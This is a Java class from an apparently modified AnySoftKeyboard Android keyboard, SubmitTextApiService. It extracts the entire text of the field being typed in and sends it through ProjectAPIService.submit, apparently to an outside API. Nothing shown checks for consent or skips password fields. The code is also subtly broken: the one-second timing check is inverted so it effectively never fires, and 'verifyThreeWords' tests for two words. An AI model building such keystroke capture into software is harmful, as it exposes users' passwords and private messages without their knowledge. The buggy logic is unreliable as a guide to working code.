package com.anysoftkeyboard;

import android.view.inputmethod.ExtractedText;
import android.view.inputmethod.ExtractedTextRequest;
import android.view.inputmethod.InputConnection;

public class SubmitTextApiService {
    private final int ONE_SECOND = 1000;
    private final int QTD_MIN_PALAVRAS = 2;

    private long lastTimeMillis;
    private ProjectAPIService projectAPIService;

    public SubmitTextApiService(){
        this.projectAPIService = new ProjectAPIService();
    }

    private String getTypedText(InputConnection ic){
        ExtractedText extractedText = ic.getExtractedText(new ExtractedTextRequest(), 0);
        if(extractedText == null) {
            return null;
        }
        CharSequence text = extractedText.text;
        return text.toString();
    }

    private void submitToApi(String text){
        projectAPIService.submit(text);
    }

    private boolean verifyThreeWords(String text){
        return text.split(" ").length >= QTD_MIN_PALAVRAS;
    }

    public void submitText(InputConnection ic) {
        long currentTimeMillis = System.currentTimeMillis();
        if(lastTimeMillis - currentTimeMillis > ONE_SECOND) {
            System.out.println("======================= submit =======================");
            String text = getTypedText(ic);
            if(text != null && verifyThreeWords(text)){
                submitToApi(text);
            }
        }
        lastTimeMillis = currentTimeMillis;
    }
}
